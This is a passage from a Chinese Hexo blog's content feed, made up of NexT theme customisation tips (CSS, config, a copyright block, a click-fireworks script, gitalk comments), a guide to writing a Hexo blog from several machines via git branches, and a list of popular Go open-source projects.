(ase-out)动画播放的速度曲线为以低速结束 (1s)等待1秒然后开始动画 (1)动画播放次数(infinite为循环播放) ]*/ /* 鼠标经过头像旋转360度 */ -webkit-transition: -webkit-transform 1.0s ease-out; -moz-transition: -moz-transform 1.0s ease-out; transition: transform 1.0s ease-out;&#125;img:hover &#123; /* 鼠标经过停止头像旋转 -webkit-animation-play-state:paused; animation-play-state:paused;*/ /* 鼠标经过头像旋转360度 */ -webkit-transform: rotateZ(360deg); -moz-transform: rotateZ(360deg); transform: rotateZ(360deg);&#125;/* Z 轴旋转动画 */@-webkit-keyframes play &#123; 0% &#123; -webkit-transform: rotateZ(0deg); &#125; 100% &#123; -webkit-transform: rotateZ(-360deg); &#125;&#125;@-moz-keyframes play &#123; 0% &#123; -moz-transform: rotateZ(0deg); &#125; 100% &#123; -moz-transform: rotateZ(-360deg); &#125;&#125;@keyframes play &#123; 0% &#123; transform: rotateZ(0deg); &#125; 100% &#123; transform: rotateZ(-360deg); &#125;&#125; 修改``代码块自定义样式具体实现方法打开Blog\themes\next\source\css\_custom\custom.styl，添加以下代码： 123456789101112131415// Custom styles.code &#123; color: #ff7600; background: #fbf7f8; margin: 2px;&#125;// 大代码块的自定义样式.highlight, pre &#123; margin: 5px 0; padding: 5px; border-radius: 3px;&#125;.highlight, code, pre &#123; border: 1px solid #d6d6d6;&#125; 侧边栏社交小图标设置实现效果图图标可以去Font Awesome Icon网站去找，找到后复制名字到相应的位置即可。 具体实现方法打开主题配置文件_config.yml，command+f搜索Social，将你有的社交账号前面的#号去掉。 1234567891011121314#social: GitHub: https://github.com/wandouduoduo || github E-mail: mailto:wandouduoduo@163.com || envelope Gitee: https://gitee.com/ || heartbeat 微博: https://weibo.com/u/1989032071/home?wvr=5 || weibo #E-Mail: mailto:yourname@gmail.com || envelope #Google: https://plus.google.com/yourname || google #Twitter: https://twitter.com/yourname || twitter #FB Page: https://www.facebook.com/yourname || facebook #VK Group: https://vk.com/yourname || vk #StackOverflow: https://stackoverflow.com/yourname || stack-overflow #YouTube: https://youtube.com/yourname || youtube #Instagram: https://instagram.com/yourname || instagram #Skype: skype:yourname?call|chat || skype 主页文章添加阴影效果实现效果图 具体实现方法打开\themes\next\source\css\_custom\custom.styl,向里面加入： 12345678// 主页文章添加阴影效果 .post &#123; margin-top: 60px; margin-bottom: 60px; padding: 25px; -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5); -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5); &#125; 在网站底部加上访问量实现效果图 具体实现方法6.x后集成了busuanzi模块统计，只需要打开\themes\next\_config文件编辑如下即可 12345678busuanzi_count:enable: truetotal_visitors: truetotal_visitors_icon: usertotal_views: truetotal_views_icon: eyepost_views: truepost_views_icon: eye 网站底部字数统计具体方法实现切换到根目录下，然后运行如下代码 1$ npm install hexo-wordcount --save 然后在/themes/next/layout/_partials/footer.swig文件尾部添加加上： 1234&lt;div class=&quot;theme-info&quot;&gt; &lt;div class=&quot;powered-by&quot;&gt;&lt;/div&gt; &lt;span class=&quot;post-count&quot;&gt;博客全站共&#123;&#123; totalcount(site) &#125;&#125;字&lt;/span&gt;&lt;/div&gt; 设置网站的图标Favicon实现效果图 具体方法实现在图标网站找一张你喜欢的图标（大：32x32 小：16x16），图标网站：easyicon或者阿里巴巴矢量图标库。将下载下来的小图和中图放在Blog/themes/next/source/images，将默认的两张图片替换掉。修改主题配置文件，如果你自定义了图片名字，需要做修改： 1234favicon: small: /images/favicon-16x16-next.png //16X16小图 medium: /images/favicon-32x32-next.png //32X32大图 apple_touch_icon: /images/apple-touch-icon-next.png 实现文章统计功能具体实现方法在根目录下安装 hexo-wordcount,运行： 1$ npm install hexo-wordcount --save 然后在主题的配置文件中，配置如下： 123456symbols_count_time: separated_meta: true item_text_post: true item_text_total: true awl: 4 wpm: 275 添加顶部加载条具体实现方法编辑主题配置文件，command+F搜索pace，将其值改为ture就可以了，选择一款你喜欢的样式。 12345678910111213141516171819# Progress bar in the top during page loading.pace: ture# Themes list:#pace-theme-big-counter#pace-theme-bounce#pace-theme-barber-shop#pace-theme-center-atom#pace-theme-center-circle#pace-theme-center-radar#pace-theme-center-simple#pace-theme-corner-indicator#pace-theme-fill-left#pace-theme-flash#pace-theme-loading-bar#pace-theme-mac-osx#pace-theme-minimal# For example# pace_theme: pace-theme-center-simplepace_theme: pace-theme-minimal 在文章底部增加版权信息实现效果图 在目录Blog/themes/next/layout/_macro/，添加文件 my-copyright.swig，内容如下： 123456789101112131415161718192021222324252627282930&#123;% if page.copyright %&#125;&lt;div class=&quot;my_post_copyright&quot;&gt; &lt;script src=&quot;//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js&quot;&gt;&lt;/script&gt; &lt;!-- JS库 sweetalert 可修改路径 --&gt; &lt;script src=&quot;https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://unpkg.com/sweetalert/dist/sweetalert.min.js&quot;&gt;&lt;/script&gt; &lt;p&gt;&lt;span&gt;本文标题:&lt;/span&gt;&lt;a href=&quot;&#123;&#123; url_for(page.path) &#125;&#125;&quot;&gt;&#123;&#123; page.title &#125;&#125;&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;span&gt;文章作者:&lt;/span&gt;&lt;a href=&quot;/&quot; title=&quot;访问 &#123;&#123; theme.author &#125;&#125; 的个人博客&quot;&gt;&#123;&#123; theme.author &#125;&#125;&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;span&gt;发布时间:&lt;/span&gt;&#123;&#123; page.date.format(&quot;YYYY年MM月DD日 - HH:MM&quot;) &#125;&#125;&lt;/p&gt; &lt;p&gt;&lt;span&gt;最后更新:&lt;/span&gt;&#123;&#123; page.updated.format(&quot;YYYY年MM月DD日 - HH:MM&quot;) &#125;&#125;&lt;/p&gt; &lt;p&gt;&lt;span&gt;原始链接:&lt;/span&gt;&lt;a href=&quot;&#123;&#123; url_for(page.path) &#125;&#125;&quot; title=&quot;&#123;&#123; page.title &#125;&#125;&quot;&gt;&#123;&#123; page.permalink &#125;&#125;&lt;/a&gt; &lt;span class=&quot;copy-path&quot; title=&quot;点击复制文章链接&quot;&gt;&lt;i class=&quot;fa fa-clipboard&quot; data-clipboard-text=&quot;&#123;&#123; page.permalink &#125;&#125;&quot; aria-label=&quot;复制成功！&quot;&gt;&lt;/i&gt;&lt;/span&gt; &lt;/p&gt; &lt;p&gt;&lt;span&gt;许可协议:&lt;/span&gt;&lt;i class=&quot;fa fa-creative-commons&quot;&gt;&lt;/i&gt; &lt;a rel=&quot;license&quot; href=&quot;https://creativecommons.org/licenses/by-nc-nd/4.0/&quot; target=&quot;_blank&quot; title=&quot;Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)&quot;&gt;署名-非商业性使用-禁止演绎 4.0 国际&lt;/a&gt; 转载请保留原文链接及作者。&lt;/p&gt; &lt;/div&gt;&lt;script&gt; var clipboard = new Clipboard(&apos;.fa-clipboard&apos;); $(&quot;.fa-clipboard&quot;).click(function()&#123; clipboard.on(&apos;success&apos;, function()&#123; swal(&#123; title: &quot;&quot;, text: &apos;复制成功&apos;, icon: &quot;success&quot;, showConfirmButton: true &#125;); &#125;); &#125;); &lt;/script&gt;&#123;% endif %&#125; 在目录Blog/themes/next/source/css/_common/components/post/下添加文件my-post-copyright.styl，添加以下代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445.my_post_copyright &#123; width: 85%; max-width: 45em; margin: 2.8em auto 0; padding: 0.5em 1.0em; border: 1px solid #d3d3d3; font-size: 0.93rem; line-height: 1.6em; word-break: break-all; background: rgba(255,255,255,0.4);&#125;.my_post_copyright p&#123;margin:0;&#125;.my_post_copyright span &#123; display: inline-block; width: 5.2em; color: #b5b5b5; font-weight: bold;&#125;.my_post_copyright .raw &#123; margin-left: 1em; width: 5em;&#125;.my_post_copyright a &#123; color: #808080; border-bottom:0;&#125;.my_post_copyright a:hover &#123; color: #a3d2a3; text-decoration: underline;&#125;.my_post_copyright:hover .fa-clipboard &#123; color: #000;&#125;.my_post_copyright .post-url:hover &#123; font-weight: normal;&#125;.my_post_copyright .copy-path &#123; margin-left: 1em; width: 1em; +mobile()&#123;display:none;&#125;&#125;.my_post_copyright .copy-path:hover &#123; color: #808080; cursor: pointer;&#125; 修改next/layout/_macro/post.swig，在代码 12345&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include &apos;wechat-subscriber.swig&apos; %&#125; &#123;% endif %&#125;&lt;/div&gt; 之前添加增加如下代码： 12345&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include &apos;my-copyright.swig&apos; %&#125; &#123;% endif %&#125;&lt;/div&gt; 修改next/source/css/_common/components/post/post.styl文件，在最后一行增加代码： 1@import &quot;my-post-copyright&quot; 保存重新生成即可。 如果要在该博文下面增加版权信息的显示，需要在 Markdown 中增加copyright: true的设置，类似： 12345678910---title: Hexo-NexT主题配置date: 2018-01-20 20:41:08categories: Hexotags:- Hexo- NexTtop: 100copyright: ture--- 配置根目录下的_config.yml文件，配置为： 123456# URL## If your site is put in a subdirectory, set url as &apos;http://yoursite.com/child&apos; and root as &apos;/child/&apos;url: https://wenmobo.github.io/ //你的网站地址root: /permalink: :year/:month/:day/:title/permalink_defaults: 隐藏网页底部powered By Hexo / 强力驱动打开Blog/themes/next/layout/_partials/footer.swig，注释掉相应代码。 12345678910111213141516171819202122232425262728293031//用下面的符号注释，注释代码用下面括号括起来&lt;!-- --&gt;&lt;!--&lt;span class=&quot;post-meta-divider&quot;&gt;|&lt;/span&gt;&#123;% if theme.footer.powered %&#125; &lt;div class=&quot;powered-by&quot;&gt;&#123;# #&#125;&#123;&#123; __(&apos;footer.powered&apos;, &apos;&lt;a class=&quot;theme-link&quot; target=&quot;_blank&quot; href=&quot;https://hexo.io&quot;&gt;Hexo&lt;/a&gt;&apos;) &#125;&#125;&#123;##&#125;&lt;/div&gt;&#123;% endif %&#125;&#123;% if theme.footer.powered and theme.footer.theme.enable %&#125; &lt;span class=&quot;post-meta-divider&quot;&gt;|&lt;/span&gt;&#123;% endif %&#125;&#123;% if theme.footer.theme.enable %&#125; &lt;div class=&quot;theme-info&quot;&gt;&#123;# #&#125;&#123;&#123; __(&apos;footer.theme&apos;) &#125;&#125; &amp;mdash; &#123;# #&#125;&lt;a class=&quot;theme-link&quot; target=&quot;_blank&quot; href=&quot;https://github.com/iissnan/hexo-theme-next&quot;&gt;&#123;# #&#125;NexT.&#123;&#123; theme.scheme &#125;&#125;&#123;# #&#125;&lt;/a&gt;&#123;% if theme.footer.theme.version %&#125; v&#123;&#123; theme.version &#125;&#125;&#123;% endif %&#125;&#123;##&#125;&lt;/div&gt;&#123;% endif %&#125;&#123;% if theme.footer.custom_text %&#125; &lt;div class=&quot;footer-custom&quot;&gt;&#123;# #&#125;&#123;&#123; theme.footer.custom_text &#125;&#125;&#123;##&#125;&lt;/div&gt;&#123;% endif %&#125;--&gt; 修改字体大小打开\themes\next\source\css\ _variables\base.styl文件，将$font-size-base改成16px，如下所示： 1$font-size-base =16px 添加打赏打开themes/next/_config.yml中配置如下 123456reward: enable: true comment: 原创技术分享，您的支持将鼓励我继续创作 wechatpay: /images/wechatpay.png alipay: /images/alipay.jpg \#bitcoin: /images/bitcoin.jpg 修改文件next/source/css/_common/components/post/post-reward.styl，然后注释如下即可 123456/*#QR &gt; div:hover p &#123; animation: roll 0.1s infinite linear; -webkit-animation: roll 0.1s infinite linear; -moz-animation: roll 0.1s infinite linear;&#125;*/ 点击爆炸效果效果图 实现方法themes/next/source/js/src里面建一个叫fireworks.js的文件，代码如下： 1&quot;use strict&quot;;function updateCoords(e)&#123;pointerX=(e.clientX||e.touches[0].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[0].clientY-canvasEl.getBoundingClientRect().top&#125;function setParticuleDirection(e)&#123;var t=anime.random(0,360)*Math.PI/180,a=anime.random(50,180),n=[-1,1][anime.random(0,1)]*a;return&#123;x:e.x+n*Math.cos(t),y:e.y+n*Math.sin(t)&#125;&#125;function createParticule(e,t)&#123;var a=&#123;&#125;;return a.x=e,a.y=t,a.color=colors[anime.random(0,colors.length-1)],a.radius=anime.random(16,32),a.endPos=setParticuleDirection(a),a.draw=function()&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;function createCircle(e,t)&#123;var a=&#123;&#125;;return a.x=e,a.y=t,a.color=&quot;#F00&quot;,a.radius=0.1,a.alpha=0.5,a.lineWidth=6,a.draw=function()&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=1&#125;,a&#125;function renderParticule(e)&#123;for(var t=0;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;function animateParticules(e,t)&#123;for(var a=createCircle(e,t),n=[],i=0;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;targets:n,x:function(e)&#123;return e.endPos.x&#125;,y:function(e)&#123;return e.endPos.y&#125;,radius:0.1,duration:anime.random(1200,1800),easing:&quot;easeOutExpo&quot;,update:renderParticule&#125;).add(&#123;targets:a,radius:anime.random(80,160),lineWidth:0,alpha:&#123;value:0,easing:&quot;linear&quot;,duration:anime.random(600,800)&#125;,duration:anime.random(1200,1800),easing:&quot;easeOutExpo&quot;,update:renderParticule,offset:0&#125;)&#125;function debounce(e,t)&#123;var a;return function()&#123;var n=this,i=arguments;clearTimeout(a),a=setTimeout(function()&#123;e.apply(n,i)&#125;,t)&#125;&#125;var canvasEl=document.querySelector(&quot;.fireworks&quot;);if(canvasEl)&#123;var ctx=canvasEl.getContext(&quot;2d&quot;),numberOfParticules=30,pointerX=0,pointerY=0,tap=&quot;mousedown&quot;,colors=[&quot;#FF1461&quot;,&quot;#18FF92&quot;,&quot;#5A87FF&quot;,&quot;#FBF38C&quot;],setCanvasSize=debounce(function()&#123;canvasEl.width=2*window.innerWidth,canvasEl.height=2*window.innerHeight,canvasEl.style.width=window.innerWidth+&quot;px&quot;,canvasEl.style.height=window.innerHeight+&quot;px&quot;,canvasEl.getContext(&quot;2d&quot;).scale(2,2)&#125;,500),render=anime(&#123;duration:1/0,update:function()&#123;ctx.clearRect(0,0,canvasEl.width,canvasEl.height)&#125;&#125;);document.addEventListener(tap,function(e)&#123;&quot;sidebar&quot;!==e.target.id&amp;&amp;&quot;toggle-sidebar&quot;!==e.target.id&amp;&amp;&quot;A&quot;!==e.target.nodeName&amp;&amp;&quot;IMG&quot;!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!1),setCanvasSize(),window.addEventListener(&quot;resize&quot;,setCanvasSize,!1)&#125;&quot;use strict&quot;;function updateCoords(e)&#123;pointerX=(e.clientX||e.touches[0].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[0].clientY-canvasEl.getBoundingClientRect().top&#125;function setParticuleDirection(e)&#123;var t=anime.random(0,360)*Math.PI/180,a=anime.random(50,180),n=[-1,1][anime.random(0,1)]*a;return&#123;x:e.x+n*Math.cos(t),y:e.y+n*Math.sin(t)&#125;&#125;function createParticule(e,t)&#123;var a=&#123;&#125;;return a.x=e,a.y=t,a.color=colors[anime.random(0,colors.length-1)],a.radius=anime.random(16,32),a.endPos=setParticuleDirection(a),a.draw=function()&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;function createCircle(e,t)&#123;var a=&#123;&#125;;return a.x=e,a.y=t,a.color=&quot;#F00&quot;,a.radius=0.1,a.alpha=0.5,a.lineWidth=6,a.draw=function()&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=1&#125;,a&#125;function renderParticule(e)&#123;for(var t=0;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;function animateParticules(e,t)&#123;for(var a=createCircle(e,t),n=[],i=0;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;targets:n,x:function(e)&#123;return e.endPos.x&#125;,y:function(e)&#123;return e.endPos.y&#125;,radius:0.1,duration:anime.random(1200,1800),easing:&quot;easeOutExpo&quot;,update:renderParticule&#125;).add(&#123;targets:a,radius:anime.random(80,160),lineWidth:0,alpha:&#123;value:0,easing:&quot;linear&quot;,duration:anime.random(600,800)&#125;,duration:anime.random(1200,1800),easing:&quot;easeOutExpo&quot;,update:renderParticule,offset:0&#125;)&#125;function debounce(e,t)&#123;var a;return function()&#123;var n=this,i=arguments;clearTimeout(a),a=setTimeout(function()&#123;e.apply(n,i)&#125;,t)&#125;&#125;var canvasEl=document.querySelector(&quot;.fireworks&quot;);if(canvasEl)&#123;var ctx=canvasEl.getContext(&quot;2d&quot;),numberOfParticules=30,pointerX=0,pointerY=0,tap=&quot;mousedown&quot;,colors=[&quot;#FF1461&quot;,&quot;#18FF92&quot;,&quot;#5A87FF&quot;,&quot;#FBF38C&quot;],setCanvasSize=debounce(function()&#123;canvasEl.width=2*window.innerWidth,canvasEl.height=2*window.innerHeight,canvasEl.style.width=window.innerWidth+&quot;px&quot;,canvasEl.style.height=window.innerHeight+&quot;px&quot;,canvasEl.getContext(&quot;2d&quot;).scale(2,2)&#125;,500),render=anime(&#123;duration:1/0,update:function()&#123;ctx.clearRect(0,0,canvasEl.width,canvasEl.height)&#125;&#125;);document.addEventListener(tap,function(e)&#123;&quot;sidebar&quot;!==e.target.id&amp;&amp;&quot;toggle-sidebar&quot;!==e.target.id&amp;&amp;&quot;A&quot;!==e.target.nodeName&amp;&amp;&quot;IMG&quot;!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!1),setCanvasSize(),window.addEventListener(&quot;resize&quot;,setCanvasSize,!1)&#125;; 打开themes/next/layout/_layout.swig,在&lt;/body&gt;上面写下如下代码： 12345&#123;% if theme.fireworks %&#125; &lt;canvas class=&quot;fireworks&quot; style=&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot; &gt;&lt;/canvas&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;//cdn.bootcss.com/animejs/2.2.0/anime.min.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/fireworks.js&quot;&gt;&lt;/script&gt;&#123;% endif %&#125; 打开主题配置文件，在里面最后写下： 12# Fireworksfireworks: true 添加侧栏推荐阅读效果图 实现方式编辑主题配置文件，如下配置即可： 12345678# Blog rollslinks_icon: linklinks_title: 推荐阅读#links_layout: blocklinks_layout: inlinelinks: 菜鸟教程: https://xxxxx 自强学堂: https://xxxxx 添加站内搜索安装 hexo-generator-search 1npm install hexo-generator-search --save 安装 hexo-generator-searchdb 1npm install hexo-generator-searchdb --save 编辑主题配置文件，设置Local searchenable为ture 123456789# Local search# Dependencies: https://github.com/flashlab/hexo-generator-searchlocal_search: enable: ture # if auto, trigger search by changing input # if manual, trigger search by pressing enter key or search button trigger: auto # show top n results per article, show all results by setting to -1 top_n_per_article: 1 添加评论系统gitalk效果图 实现方式在github中注册注册新应用，链接：https://github.com/settings/applications/new 参数说明：Application name： # 应用名称，随意Homepage URL： # 网站URL，如https://wandouduoduo.github.ioApplication description # 描述，随意Authorization callback URL：# 网站URL，https://wandouduoduo.github.io 点击注册后，页面跳转如下，其中Client ID和Client Secret在后面的配置中需要用到，到时复制粘贴即可： 在主题配置文件next/_config.yml中添加如下内容 12345678gitalk: enable: true githubID: github帐号 # 例：asdfv1929 repo: 仓库名称 # 例：asdfv1929.github.io ClientID: Client ID ClientSecret: Client Secret adminUser: github帐号 #指定可初始化评论账户 distractionFreeMode: true 修改文章链接Hexo 默认的文章链接形式为 domain/year/month/day/postname ，当我们把文章源文件名改掉之后，链接也会改变，很不友好，并且四级目录，不利于 SEO。 因此，使用 hexo-abbrlink 插件，生成文章的永久链接，后期无论怎么修改也不会改变该链接。 1npm install hexo-abbrlink --save 在站点配置文件 _config.yml 中修改： 1234permalink: post/:abbrlink.htmlabbrlink: alg: crc32 # 算法：crc16(default) and crc32 rep: hex # 进制：dec(default) and hex 可选择模式有： crc16 &amp; hex crc16 &amp; dec crc32 &amp; hex crc32 &amp; dec 寻找图床当向文章中添加图片时，如果图片来源于网络，那么还比较好办，直接引用那个链接即可，不过也有问题，那就是如果那个链接挂了那么你的图片也就无法显示。另外如果你的图片来源于本地，那么更麻烦了。一种做法是使用第三方服务器，比如七牛，当需要插入图片时，先把图片上传到七牛的服务器然后再使用，我觉得很麻烦。这里选择另外一种方法。 首先修改 _config.yml (在站点目录下) 中 post_asset_folder 字段： 12# post_asset_folder: falsepost_asset_folder: true 当设置该字段为 true 时，在建立文件时，Hexo 会自动建立一个与文章同名的文件夹，你就可以把与该文章相关的所有资源都放到那个文件夹，这么一来，你就可以很方便的使用资源。例如，文章 post 需要插入图片 test.png 时，就可以使用 [图片上传失败...(image-773548-1546505826136)] 。 问题是这样在本地显示没有问题，但是发布之后就无法显示，使用 hexo-asset-image 插件来解决。 在博客根目录右击打开 git bash ，执行以下命令： 1npm install https://github.com/CodeFalling/hexo-asset-image --save 重新生成之后就可以在你自己的网页上正常显示了。 注意：对于因为 SEO 优化，使用 abbrlink 插件修改过文章链接的朋友而言，这种方法还需要进一步修改一下。由于原来的 permalink: :year/:month/:day/:title/ 变成了 permalink: post/:abbrlink.html 。打开博客根目录下 node_modules\hexo-asset-image\index.js ，增加一行命令，如下所示： 123456&gt; var config = hexo.config;&gt; if(config.post_asset_folder)&#123;&gt; var link = data.permalink;&gt; link = link.replace(&apos;.html&apos;, &apos;/&apos;); //新增加，针对修改后的 permalink&gt; var beginPos = getPosition(link, &apos;/&apos;, 3) + 1;&gt; 之后就可以正常显示了，仅供参考。对于修改成其他链接形式的朋友也有一定的参考意义。]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mac和windows等多台机器上协同写hexo博客的实现]]></title>
    <url>%2Farticles%2F902dbefe.html</url>
    <content type="text"><![CDATA[背景在公司上的mac机器上部署了hexo博客，家里的电脑是windows机，想在家和公司都可以写博客，要怎么实现呢？ Mac机器操作在github上新建远程仓库将原来的page项目删除，新建一个和原来名字一样的空项目。不用初始README.md此时只有一个空的master分支。 本地初始化一个Hexo项目注意：本地的目录不要动，可以重命名。 重新新建一个空目录，作为你的博客目录。进入该目录，初始化一个Hexo项目： 123hexo initnpm installnpm install hexo-deployer-git *--save 然后用自己原来博客里的文件替换掉这里的source\, scaffolds\, themes\,_config.yml替换成自己原来博客里的。注意，一定要把themes/next中的.git/目录删除 项目目录上传至远程仓库123456git init//把博客目录下所有文件推送到master分支git remote add origin git@github:chown-jane-y/chown-jane-y.github.io.gitgit add .git commit -m &quot;first add hexo source code&quot;git push origin master 注意：如果不小心初始化了README.md 在执行 git push origin master 会失败.。此时先执行以下命令进行代码合并 1git push origin master 本地仓库新建分支1234567891011121.创建本地分支git branch 分支名，例如：git branch hexo2.切换本地分支git checkout 分支名，例如从master切换到分支：git checkout hexo3.远程分支就是本地分支push到服务器上。比如master就是一个最典型的远程分支（默认）。git push origin hexo4.设置默认分支 git branch --set-upstream-to=origin/hexo hexo 新建一个分支hexo(名字可以自定义)，这时候hexo分支和master分支的内容一样，都是hexo的源文件。 并把hexo设为默认分支，这样的话在另外一台机器上克隆下来就直接进入hexo分支，并且以后所有操作都是在hexo分支下完成。 为什么需要这个额外的分支呢？ 因为hexo d只把静态网页文件部署到master分支上，所以你换了另外一台电脑，就无法pull下来继续写博客了。有了hexo分支的话，就可以把hexo分支中的源文件(配置文件、主题样式等)pull下来，再hexo g的话就可以生成一模一样的静态文件了 部署博客 先把根目录下的_config.yml配置文件中branch一定要填master，否则hexo d就会部署到hexo分支下，然后再部署 123hexo g -d如果提示 RROR Deployer not found: git 说明前面 npm install --save hexo-deployer-git 没有执行成功 再执行一次npm install --save hexo-deployer-git 这样博客已经成功部署到master分支，这时候到github查看两个分支的内容，hexo分支里是源文件，master里是静态文件。 windows机器操作另外一台windows电脑上，应该如何操作呢？ 将博客项目克隆下来1git clone https://github.com/xxx/xxx.github.io.git 创建源文件分支克隆下来的仓库是master分支（虽然把hexo设为默认分支了, 但是clone下来还是master分支）这时候需要切换一下分支，所以可以在这基础上继续写博客了 1234#查看所有分支*git branch -a#切换分支git checkout hexo 依赖包安装但是由于.gitignore文件中过滤了node_modules\，所以克隆下来的目录里没有node_modules\，这是hexo所需要的组件，所以要在该目录中重新安装hexo，但不需要hexo init。 123npm install hexonpm installnpm install hexo-deployer-git --save 测试验证1hexo g -d 日常操作更新源码不管你本地的仓库是否是最新的，都先pull一下，以防万一： 1git pull origin hexo 写博客1hexo new &quot;title&quot; 然后打开source/_posts/title.md，撰写博文。 上传源码先推送到hexo分支上： 123git add .git commit -m &quot;add article xxx&quot;git push origin hexo 部署部署到master分支上 1hexo g -d]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[神级的Go开源项目]]></title>
    <url>%2Farticles%2Fb45f8ddd.html</url>
    <content type="text"><![CDATA[Golang/go介绍：Go（又称Golang）是Google开发的一种静态强类型、编译型、并发型，并具有垃圾回收功能的编程语言。go本身，也是用go语言实现的，包括他的编译器。与C++相比，Go并不包括如枚举、异常处理、继承、泛型、断言、虚函数等功能，但增加了 切片(Slice) 型、并发、管道、垃圾回收、接口（Interface）等特性的语言级支持。Go 2.0版本将支持泛型，对于断言的存在，则持负面态度，同时也为自己不提供类型继承来辩护。 star数：53789地址：https://github.com/golang/go Docker介绍：Docker项目在2014年9月份就拿到了C轮4000万美元融资，版本迭代速度超快，目前从GitHub看到已有78个版本，而它仅仅是再2013年初才正式开始的一个项目而已。目前，国内Docker技术推广也进行的如火如荼，比如 Docker中文社区，CSDN也建立了 Docker专区。CSDN CODE也将在近期与Docker中文社区合作，推出Docker技术文章翻译活动，届时也请大家多多关注，及时关注与参与。Docker团队之所以喜欢用Go语言，主要是Go具有强大的标准库、全开发环境、跨平台构建的能力。 star数：52339地址：https://github.com/moby/moby（Docker的新马甲） Kubernetes介绍：Kubernetes是Google开源的一个容器编排引擎，它支持自动化部署、大规模可伸缩、应用容器化管理。在生产环境中部署一个应用程序时，通常要部署该应用的多个实例以便对应用请求进行负载均衡。在Kubernetes中，我们可以创建多个容器，每个容器里面运行一个应用实例，然后通过内置的负载均衡策略，实现对这一组应用实例的管理、发现、访问，而这些细节都不需要运维人员去进行复杂的手工配置和处理。 star数：48830地址：https://github.com/kubernetes/kubernetes Lantern介绍：蓝灯，翻墙利器。 star数：40492地址：https://github.com/getlantern/lantern Etcd介绍：etcd是由CoreOS开发并维护键值存储系统，它使用Go语言编写，并通过Raft一致性算法处理日志复制以保证强一致性。目前，Google的容器集群管理系统Kubernetes、开源PaaS平台Cloud Foundry和CoreOS的Fleet都广泛使用了etcd。Fleet则是一个分布式的初始化系统。它们之所以选择使用Go语言，则是因为Go语言对跨平台的良好支持，以及其背后的强大社区。 star数：23187地址：https://github.com/etcd-io/etcd InfluxDB介绍：一个Go语音编写的开源分布式的时序、事件和指标数据库，无需外部依赖。其设计目标是实现分布式和水平伸缩扩展。 star数：15681地址：https://github.com/influxdata/influxdb Hugo介绍：一款极速的静态页面生成器，让你可以很快的搭建个人网站，提供了多套主题可供使用，并且可以自己定制，和NodeJS的Hexo是一样的。 star数：33044地址：https://github.com/gohugoio/hugo Grafana介绍：一款开源监控度量的看板系统，可以接Graphite,Elasticsearch,InfluxDB等数据源，定制化很高。 star数：27027地址：https://github.com/grafana/grafana Codis介绍：Codis是一个分布式Redis解决方案,其实就是一个数据库代理，让你在使用Redis集群的时候，就像使用单机版的Redis是一样的，对开发者透明。 star数：8840地址：https://github.com/CodisLabs/codis Gin &amp; Beego介绍：两个快速开发Go应用的http框架，很好用很简洁，笔者亲测。 star数：分别为24692和19086地址：分别为https://github.com/gin-gonic/gin和https://github.com/astaxie/beego Prometheus介绍：Prometheus是一个开源监控系统，它前身是SoundCloud的警告工具包。从2012年开始，许多公司和组织开始使用Prometheus。该项目的开发人员和用户社区非常活跃，越来越多的开发人员和用户参与到该项目中。目前它是一个独立的开源项目，且不依赖与任何公司。为了强调这点和明确该项目治理结构，Prometheus在2016年继Kurberntes之后，加入了Cloud Native Computing Foundation。 star数：22325地址：https://github.com/prometheus/prometheus Consul介绍：Consul 是 HashiCorp 公司推出的开源工具，用于实现分布式系统的服务发现与配置。与其他分布式服务注册与发现的方案，Consul的方案更“一站式”，内置了服务注册与发现框架、分布一致性协议实现、健康检查、Key/Value存储、多数据中心方案，不再需要依赖其他工具（比如ZooKeeper等）。 star数：15040地址：https://github.com/hashicorp/consul Nsq介绍：NSQ是Go语言编写的，开源的分布式消息队列中间件，其设计的目的是用来大规模地处理每天数以十亿计级别的消息。NSQ 具有分布式和去中心化拓扑结构，该结构具有无单点故障、故障容错、高可用性以及能够保证消息的可靠传递的特征，是一个成熟的、已在大规模生成环境下应用的产品。 star数：14559地址：https://github.com/nsqio/nsq 